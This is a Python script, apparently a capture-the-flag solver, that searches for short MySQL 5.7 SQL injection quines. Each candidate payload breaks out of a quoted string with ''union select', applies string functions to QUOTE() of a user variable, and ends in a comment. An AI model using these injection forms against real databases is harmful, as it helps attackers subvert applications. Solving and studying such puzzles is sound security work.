#!/usr/bin/env python3
"""Deeper local search for MySQL 5.7 Ouroboros Golf quine shapes.

This is intentionally not a random fuzzer.  It models families where the
payload source is `P + QUOTE(M) + S` and the runtime value is a deterministic
string transform of `M` and/or `QUOTE(M)`.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Callable, Iterable


def sql_quote(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "\\'").replace("\0", "\\0") + "'"


def mysql_insert(s: str, pos: int, length: int, ins: str) -> str:
    if pos < 1 or pos > len(s) + 1:
        return s
    i = pos - 1
    return s[:i] + ins + s[i + length :]


@dataclass(frozen=True)
class Candidate:
    family: str
    payload: str
    note: str

    @property
    def length(self) -> int:
        return len(self.payload.encode())


def marker_args() -> Iterable[tuple[str, str]]:
    # (SQL source text, string value)
    yield "!0", "1"
    yield "!1", "0"
    yield "0=0", "1"
    yield "0x1", "\x01"
    yield "0x9", "\t"
    yield "0xa", "\n"
    yield "0x7e", "~"


def replace_m_to_l() -> Iterable[Candidate]:
    """Runtime: REPLACE(M, marker, QUOTE(M))."""
    for arg, marker in marker_args():
        p = "'union select replace(@a:="
        s = f",{arg},quote(@a))#"
        m = p + marker + s
        q = p + sql_quote(m) + s
        if m.replace(marker, sql_quote(m)) == q:
            yield Candidate("replace(M,c,L)", q, f"marker={arg!r}")


def insert_m_l() -> Iterable[Candidate]:
    """Runtime: INSERT(M, p, len, QUOTE(M)); search all insertion positions."""
    length_forms = [("0", 0), ("!1", 0), ("1", 1), ("!0", 1)]
    for pos in range(1, 90):
        pos_forms = [(str(pos), pos)]
        if pos == 1:
            pos_forms.append(("!0", 1))
        for pos_text, pos_val in pos_forms:
            for len_text, len_val in length_forms:
                p = "'union select insert(@a:="
                s = f",{pos_text},{len_text},quote(@a))#"
                m_len = len(p) + len(s) + len_val
                m = "?" * m_len
                seen: set[str] = set()
                for _ in range(200):
                    l = sql_quote(m)
                    q = p + l + s
                    i = pos_val - 1
                    if i < 0 or i > len(m):
                        break
                    # For len>0 the deleted characters are not visible in Q.
                    # Reuse the current guess for those positions and iterate.
                    m2 = q[:i] + m[i : i + len_val] + q[i + len(l) :]
                    if len(m2) != m_len:
                        break
                    if m2 == m:
                        if mysql_insert(m, pos_val, len_val, l) == q:
                            yield Candidate("insert(M,p,n,L)", q, f"p={pos_text}, len={len_text}")
                        break
                    if m2 in seen:
                        break
                    seen.add(m2)
                    m = m2


def concat_forms() -> Iterable[Candidate]:
    forms: list[tuple[str, str, str, Callable[[str, str], str]]] = [
        ("concat(M,L)", "'union select concat(@a:=", ",quote(@a))#", lambda m, l: m + l),
        ("concat(L,M)", "'union select concat(quote(@a:=", "),@a)#", lambda m, l: l + m),
        ("make_set(M,L)", "'union select make_set(3,@a:=", ",quote(@a))#", lambda m, l: m + "," + l),
        ("make_set(L,M)", "'union select make_set(3,quote(@a:=", "),@a)#", lambda m, l: l + "," + m),
    ]
    for name, p, s, runtime in forms:
        for m_len in range(0, 180):
            m = "?" * m_len
            seen: set[str] = set()
            for _ in range(200):
                l = sql_quote(m)
                q = p + l + s
                value = runtime(m, l)
                if value == q:
                    yield Candidate(name, q, f"M length={m_len}")
                    break
                # Infer the next M from simple output layouts.
                if name == "concat(M,L)" and q.endswith(l):
                    m2 = q[: -len(l)]
                elif name == "concat(L,M)" and q.startswith(l):
                    m2 = q[len(l) :]
                elif name == "make_set(M,L)" and q.endswith("," + l):
                    m2 = q[: -len("," + l)]
                elif name == "make_set(L,M)" and q.startswith(l + ","):
                    m2 = q[len(l) + 1 :]
                else:
                    break
                if len(m2) != m_len or m2 == m or m2 in seen:
                    break
                seen.add(m2)
                m = m2


def pad_repeat_reverse_forms() -> Iterable[Candidate]:
    # These are length-pruned: runtime output must have the same length as Q.
    for count in range(2, 6):
        p = "'union select repeat(@a:="
        s = f",{count})#"
        for m_len in range(0, 180):
            m = "?" * m_len
            for _ in range(40):
                q = p + sql_quote(m) + s
                m2 = q[:m_len]
                if m2 == m:
                    if m * count == q:
                        yield Candidate("repeat(M,n)", q, f"n={count}")
                    break
                m = m2

    for fn, runtime in [
        ("reverse", lambda m, _n: m[::-1]),
        ("left", lambda m, n: m[:n]),
        ("right", lambda m, n: m[-n:]),
    ]:
        for n in range(1, 160):
            p = f"'union select {fn}(@a:="
            s = f",{n})#"
            for m_len in range(0, 180):
                m = "?" * m_len
                q = p + sql_quote(m) + s
                if runtime(m, n) == q:
                    yield Candidate(f"{fn}(M,n)", q, f"n={n}, M length={m_len}")


def main() -> int:
    candidates: list[Candidate] = []
    for producer in [replace_m_to_l, insert_m_l, concat_forms, pad_repeat_reverse_forms]:
        candidates.extend(producer())

    candidates.sort(key=lambda c: (c.length, c.family, c.note))
    seen: set[str] = set()
    for c in candidates:
        if c.payload in seen:
            continue
        seen.add(c.payload)
        print(f"{c.length:3}  {c.family:18}  {c.note:18}  {c.payload!r}")
    print(f"total={len(seen)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
